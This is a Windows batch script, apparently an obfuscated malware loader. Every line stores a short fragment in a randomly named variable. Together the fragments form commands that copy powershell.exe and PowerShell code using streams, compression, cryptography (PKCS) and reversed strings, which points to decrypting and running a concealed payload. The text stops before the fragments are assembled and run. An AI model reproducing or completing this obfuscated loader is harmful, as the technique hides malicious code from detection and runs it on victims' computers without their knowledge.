@echo off
set "HNEoSPqIbt=in"
set "VECwLitHWj=0\"
set "oAuXwQdsbQ=po"
set "aYQapJDiFG=Wi"
set "mZPrBtlIfc=y "
set "TkFVJZYHEO=st"
set "MumEjYzLHY=\v"
set "FSOyJvSRHd=he"
set "gEBhCsJzaw=do"
set "rRAWlIcFXt= /"
set "gWslgIEZEh=em"
set "EGJIWovZht=py"
set "sbAXMsJDfG=nd"
set "NeccSDOLCG=:\"
set "DmjsIpRzOu= C"
set "QHNQDiSPSb=rs"
set "EiEiTkVTaB=ll"
set "YnAalMWkZa=xe"
set "AKxBsFvidZ=s\"
set "wxlUysnMpz=ll"
set "WmPdUIBGYz=1."
set "ETWOWNBOCj=co"
set "RfAURIEbLP=ws"
set "WbaivADHQt=ow"
set "XyROEsWkOh=we"
set "lpXlPexrHs=he"
set "DbhkAjWmnf=Po"
set "XAAgUnhShK=32"
set "zlGgsHNDuo=.e"
set "XxrrAqeCRt=\W"
set "GFCvCBnKwj=rS"
set "LIUhbLDfpz=Sy"
set "FLJJwjIhaQ=we"
set "FWHinCSZLf=cd"
set "zQVATJcFiZ= %~dp0"
set "iBpkmwUesz=ring"
set "riIhBryepJ=gnir"
set "whGKRTzsJj=saBm"
set "csQlYgfEZb=PKCS"
set "gOKefWnbrz=);$N"
set "yhzSweaeXE=ion."
set "mbbxKpPgdW=[]] "
set "VyOMZPqbYu=)))"
set "zBqJNicUWY=CV ="
set "QefVclyMCe=)) {"
set "ljmQsTfHLH=ress"
set "sXHsgQelUu=; };"
set "VYmUKefifF=Y.Pa"
set "ibDqqBZDxL=m(, "
set "qpMjuoJtTx=L4Yi"
set "ylWQOftSSL=.Sec"
set "dhkfssfLtj=tS46"
set "cYrBCsBCTv=k; }"
set "SwlaWhguAQ=UyCV"
set "itXpuypQPp=tsWi"
set "mUFLRHXSBX=-Obj"
set "EwbXDNWDcW=cft."
set "ionoriEuGK=ZUyC"
set "NFuaTzsZXx=eam("
set "avqNcswweM=();$"
set "bOgdUIsKaC=[IO."
set "BZwwDaXwVO= if "
